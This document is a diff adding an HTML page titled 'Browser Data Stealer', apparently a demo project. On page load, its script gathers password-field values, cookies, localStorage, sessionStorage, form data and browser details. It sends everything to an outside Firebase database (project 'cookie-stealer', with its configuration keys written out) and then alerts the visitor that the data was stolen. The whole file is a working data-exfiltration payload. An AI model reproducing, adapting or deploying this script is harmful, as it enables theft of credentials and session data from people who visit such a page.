@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Browser Data Stealer</title>
+</head>
+<body>
+  <h1>Browser Data Stealer</h1>
+  <p>Visit this site to steal your data.</p>
+
+  <!-- Firebase SDK via script tag -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-database.js";
+
+    // Your Firebase configuration (from your project)
+    const firebaseConfig = {
+      apiKey: "AIzaSyD0WZgJq6XqEYj8p9GBm5NWhpD6-rpqqDM",
+      authDomain: "cookie-stealer-35c2f.firebaseapp.com",
+      databaseURL: "https://cookie-stealer-35c2f-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "cookie-stealer-35c2f",
+      storageBucket: "cookie-stealer-35c2f.firebasestorage.app",
+      messagingSenderId: "316298229177",
+      appId: "1:316298229177:web:11498ce10fdf121fb1f268"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    // Collect all passwords
+    const passwords = Array.from(document.querySelectorAll("input[type='password']"))
+      .map(input => input.value);
+
+    // Collect browsing history
+    const history = window.history.state ? window.history.state.title : "No history";
+
+    // Collect cookies
+    const cookies = document.cookie;
+
+    // Collect localStorage
+    const localStorageData = JSON.stringify(localStorage);
+
+    // Collect sessionStorage
+    const sessionStorageData = JSON.stringify(sessionStorage);
+
+    // Collect navigator.userAgent
+    const userAgent = navigator.userAgent;
+
+    // Collect screen resolution
+    const screenRes = window.screen.width + "x" + window.screen.height;
+
+    // Collect form data
+    const formData = new FormData(document.forms[0]);
+    const formValues = {};
+    for (let [key, value] of formData.entries()) {
+      formValues[key] = value;
+    }
+
+    // Send data to Firebase
+    const data = {
+      passwords,
+      history,
+      cookies,
+      localStorage: localStorageData,
+      sessionStorage: sessionStorageData,
+      userAgent,
+      screenRes,
+      formValues
+    };
+
+    set(ref(database, "data"), data)
+      .then(() => {
+        alert("Your data has been stolen!");
+      })
+      .catch((error) => {
+        console.error("Error writing data to Firebase:", error);
+      });
+  </script>
+</body>
+</html>
